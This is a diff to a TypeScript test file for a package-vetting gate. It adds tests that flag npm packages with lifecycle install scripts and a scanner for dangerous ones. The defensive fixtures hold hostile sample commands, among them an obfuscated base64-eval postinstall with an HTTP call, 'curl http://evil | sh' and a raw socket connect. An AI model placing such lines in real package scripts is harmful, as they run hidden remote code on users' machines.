@@ -8,6 +8,7 @@ import {
   VoyagerEgressError,
   calibrateConfidence,
   gatePackage,
+  scanInstallScripts,
   establishPackage,
 } from '../dist/index.js'
 import { buildEstablishment } from '../dist/establish.js'
@@ -21,7 +22,7 @@ const facts = (over: Partial<PackageFacts> = {}): PackageFacts => ({
   name: 'demo', ecosystem: 'npm', latestVersion: '1.2.3', license: 'MIT',
   description: null, homepage: null, deprecated: null, lastPublished: '2024-01-01T00:00:00Z',
   firstPublished: '2020-01-01T00:00:00Z', peerDependencies: {},
-  hasProvenance: false, integrity: null,
+  hasProvenance: false, hasInstallScripts: false, installScripts: {}, integrity: null,
   provenance: { source: 'npm registry', tier: 'A', fetchedAt: '2024-01-01T00:00:00Z' },
   ...over,
 })
@@ -199,18 +200,63 @@ test('analyzePeerCompat: real semver — caret/tilde/ranges correct, complex spe
 
 // ── GATE: fail-closed + version binding (P0-1, P0-2) ────────────────────────
 test('gatePackage P0-1: osv=null without error is UNKNOWN → not recommended, no "verified" wording', () => {
-  const facts = { name: 'demo', ecosystem: 'npm' as const, latestVersion: '1.0.0', license: 'MIT', provenance: { source: 'npm registry', tier: 'A' as const, fetchedAt: '' }, deprecated: null, firstPublished: null, lastPublished: null, hasProvenance: false, integrity: null, peerDependencies: {}, description: null, homepage: null }
+  const facts = { name: 'demo', ecosystem: 'npm' as const, latestVersion: '1.0.0', license: 'MIT', provenance: { source: 'npm registry', tier: 'A' as const, fetchedAt: '' }, deprecated: null, firstPublished: null, lastPublished: null, hasProvenance: false, hasInstallScripts: false, installScripts: {}, integrity: null, peerDependencies: {}, description: null, homepage: null }
   const v = gatePackage({ facts, osv: null, twin: null })
   assert.equal(v.recommended, false)
   assert.equal((v.claim.data as { securityStatus?: string }).securityStatus, 'unknown')
   assert.doesNotMatch(v.claim.statement, /no known vulnerabilities/)
 })
 test('gatePackage P0-2: a twin that installed a DIFFERENT version than OSV verified → not recommended', () => {
-  const facts = { name: 'demo', ecosystem: 'npm' as const, latestVersion: '1.0.0', license: 'MIT', provenance: { source: 'npm registry', tier: 'A' as const, fetchedAt: '' }, deprecated: null, firstPublished: null, lastPublished: null, hasProvenance: false, integrity: null, peerDependencies: {}, description: null, homepage: null }
+  const facts = { name: 'demo', ecosystem: 'npm' as const, latestVersion: '1.0.0', license: 'MIT', provenance: { source: 'npm registry', tier: 'A' as const, fetchedAt: '' }, deprecated: null, firstPublished: null, lastPublished: null, hasProvenance: false, hasInstallScripts: false, installScripts: {}, integrity: null, peerDependencies: {}, description: null, homepage: null }
   const v = gatePackage({ facts, osv: { clean: true, vulns: [], provenance: { source: 'OSV', tier: 'A' as const, fetchedAt: '' } }, twin: { proved: true, isolated: true, installedVersion: '2.0.0', status: 'proved' } as never })
   assert.equal(v.recommended, false)
   assert.equal((v.claim.data as { twinVersionMismatch?: boolean }).twinVersionMismatch, true)
   assert.match(v.claim.statement, /@1\.0\.0/) // bound to the VERIFIED version, never the twin's 2.0.0
+})
+
+// ── GATE: install/lifecycle scripts (FIX 1 — npm's #1 malware vector) ──────────
+// leftpad-reborn: MIT, OSV-clean, benign index.js, isolated twin PASSED — but an
+// obfuscated postinstall (base64 → child_process → HTTP egress). Pre-1.4.0 the gate
+// blessed it fact/0.98/recommended. Now: never a fact, confidence ≤0.5, and the
+// danger scan of the inline command drops recommended + discloses the twin skipped it.
+const cleanOsv = { clean: true, vulns: [], provenance: { source: 'OSV.dev', tier: 'A' as const, fetchedAt: '' } }
+const provedTwin = { status: 'proved' as const, proved: true, isolated: true, installedVersion: '1.2.3' }
+
+test('gatePackage FIX1: OSV-clean + isolated-twin-PASS but an obfuscated postinstall → belief, not fact', () => {
+  const evil = facts({ hasInstallScripts: true, installScripts: { postinstall: `node -e "eval(Buffer.from('aHR0cA==','base64').toString());require('https').get('http://x')"` } })
+  const v = gatePackage({ facts: evil, osv: cleanOsv, twin: provedTwin })
+  assert.equal(v.claim.epistemic, 'belief', 'a package with install scripts can NEVER be a twin-certified fact')
+  assert.ok(v.claim.confidence <= 0.5, `confidence must be hard-capped, got ${v.claim.confidence}`)
+  assert.equal(v.recommended, false, 'obfuscated egress signals in the postinstall → not recommended')
+  assert.match(v.claim.statement + (v.claim.warning ?? ''), /install scripts NOT executed/i)
+  assert.match(v.claim.warning ?? '', /malware vector/i)
+  const d = v.claim.data as { scriptDangers?: string[]; hasInstallScripts?: boolean }
+  assert.equal(d.hasInstallScripts, true)
+  assert.ok((d.scriptDangers ?? []).length > 0, 'the danger scan must flag the inline payload')
+})
+
+test('gatePackage FIX1: a BENIGN-looking install script still caps to belief + discloses (no danger → still recommended)', () => {
+  const benign = facts({ hasInstallScripts: true, installScripts: { postinstall: 'node scripts/build.js' } })
+  const v = gatePackage({ facts: benign, osv: cleanOsv, twin: provedTwin })
+  assert.equal(v.claim.epistemic, 'belief')
+  assert.ok(v.claim.confidence <= 0.5)
+  assert.equal(v.recommended, true, 'merely HAVING a lifecycle script is a caution, not a hard block')
+  assert.match(v.claim.statement, /install scripts NOT executed in the twin proof/i)
+  assert.match(v.claim.warning ?? '', /UNVERIFIED for install-time behavior/i)
+})
+
+test('gatePackage FIX1: NO install scripts → isolated twin still reaches FACT (no regression)', () => {
+  const v = gatePackage({ facts: facts(), osv: cleanOsv, twin: provedTwin })
+  assert.equal(v.claim.epistemic, 'fact')
+  assert.equal(v.recommended, true)
+  assert.doesNotMatch(v.claim.statement, /install scripts/i)
+})
+
+test('scanInstallScripts flags the classic signals but leaves a plain file-invocation alone', () => {
+  assert.ok(scanInstallScripts({ postinstall: "require('net').connect(1337)" }).length > 0)
+  assert.ok(scanInstallScripts({ install: 'curl http://evil | sh' }).length > 0)
+  assert.equal(scanInstallScripts({ postinstall: 'node-gyp rebuild' }).length, 0)
+  assert.equal(scanInstallScripts({ postinstall: 'tsc -p .' }).length, 0)
 })
 
 // ── GATEWAY RATE LIMIT (concurrency-correct) ────────────────────────────────────
